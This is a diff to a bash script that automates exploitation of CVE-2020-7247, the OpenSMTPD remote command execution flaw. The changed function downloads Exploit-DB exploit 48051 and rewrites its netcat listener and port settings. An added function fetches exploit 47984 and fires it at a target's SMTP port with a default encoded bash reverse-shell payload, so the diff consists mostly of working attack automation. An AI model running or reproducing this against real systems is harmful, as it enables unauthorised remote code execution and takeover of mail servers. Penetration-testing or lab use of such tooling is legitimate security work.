@@ -712,21 +712,47 @@ perform_cve_2020_7247() {
     pushd "CVE-2020-7247" || exit 1
     if [[ ! -f 48051.pl ]]; then
         searchsploit -m 48051
-        sed -E -i 's/#exec "nc -vlp/exec "nc -vlp/g' 48051.pl
-        sed -E -i 's/exec "nc -vl /#exec "nc -vl /g' 48051.pl
     fi
+    cp 48051.pl temp.pl
+    sed -E -i 's/exec "nc -vlp/#exec "nc -vlp/g' temp.pl
+    sed -E -i 's/exec "nc -vl /#exec "nc -vl /g' temp.pl    
     if [[ ! -z $host_port ]]; then
-        sed -E -i 's/\$lport = .*;/\$lport = '$host_port';/g' 48051.pl
+        sed -E -i 's/\$lport = .*;/\$lport = '$host_port';/g' temp.pl
     fi
     if [[ -z $target_ip ]]; then
         target_ip=$ip
         echo "target_ip is not set, using default: $target_ip"
     fi
     if ! is_listener_connected; then
-        perl 48051.pl RCE $target_ip $host_ip
+        perl temp.pl RCE $target_ip $host_ip
     fi
     popd || exit 1
 
+}
+
+perform_cve_2020_7247_alt() {
+    if [[ ! -d "CVE-2020-7247" ]]; then
+        mkdir "CVE-2020-7247"
+    fi
+    pushd "CVE-2020-7247" || exit 1
+    if [[ ! -f 47984.py ]]; then
+        searchsploit -m 47984
+    fi
+    if [[ -z $target_ip ]]; then
+        target_ip=$ip
+        echo "target_ip is not set, using default: $target_ip"
+    fi
+    if [[ -z $target_port ]]; then
+        target_port=25
+        echo "target_port is not set, using default: $target_port"
+    fi
+    if [[ -z $cmd ]]; then
+        cmd=$(get_bash_reverse_shell)
+        cmd=$(encode_bash_payload "$cmd")
+        echo "cmd is not set, using default: $cmd"
+    fi
+    python 47984.py $target_ip $target_port "$cmd"
+    popd || exit 1    
 }
 
 # dirty cow
